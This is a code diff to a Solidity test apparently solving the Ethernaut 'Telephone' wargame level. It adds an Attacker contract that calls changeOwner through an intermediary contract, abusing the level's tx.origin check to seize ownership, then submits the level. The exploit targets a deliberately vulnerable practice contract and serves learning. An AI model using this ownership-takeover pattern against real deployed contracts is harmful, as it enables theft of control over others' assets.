@@ -1,18 +1,21 @@
 pragma solidity ^0.8.10;
 
 import "ds-test/test.sol";
-import "../04-Telephone/TelephoneHack.sol";
-import "../04-Telephone/TelephoneFactory.sol";
-import "../Ethernaut.sol";
-import "./utils/vm.sol";
+import "src/04-Telephone/TelephoneFactory.sol";
+import "src/Ethernaut.sol";
+import "../utils/vm.sol";
 
-contract TelephoneTest is DSTest {
+contract C_TelephoneTest is DSTest {
     Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
     Ethernaut ethernaut;
+    Attacker attacker;
+    
+    address internal constant ALICE = address(0xAA);
 
     function setUp() public {
         // Setup instance of the Ethernaut contract
         ethernaut = new Ethernaut();
+        attacker = new Attacker();
     }
 
     function testTelephoneHack() public {
@@ -23,7 +26,7 @@ contract TelephoneTest is DSTest {
 
         TelephoneFactory telephoneFactory = new TelephoneFactory();
         ethernaut.registerLevel(telephoneFactory);
-        vm.startPrank(tx.origin);
+        vm.startPrank(ALICE);
         address levelAddress = ethernaut.createLevelInstance(telephoneFactory);
         Telephone ethernautTelephone = Telephone(payable(levelAddress));
 
@@ -32,10 +35,8 @@ contract TelephoneTest is DSTest {
         // LEVEL ATTACK //
         //////////////////
 
-        // Create TelephoneHack contract
-        TelephoneHack telephoneHack = new TelephoneHack(levelAddress);
-        // Call the attack function
-        telephoneHack.attack();
+        attacker.attack(address(ethernautTelephone), ALICE);
+        emit log_named_address("new owner: ", ethernautTelephone.owner());
 
         //////////////////////
         // LEVEL SUBMISSION //
@@ -43,6 +44,13 @@ contract TelephoneTest is DSTest {
 
         bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
-        assert(levelSuccessfullyPassed);
+        assertTrue(levelSuccessfullyPassed);
+    }
+}
+
+contract Attacker{
+    function attack(address toCall, address addr) public {
+        bytes memory data = abi.encodeWithSignature("changeOwner(address)", addr);
+        toCall.call(data);
     }
 }
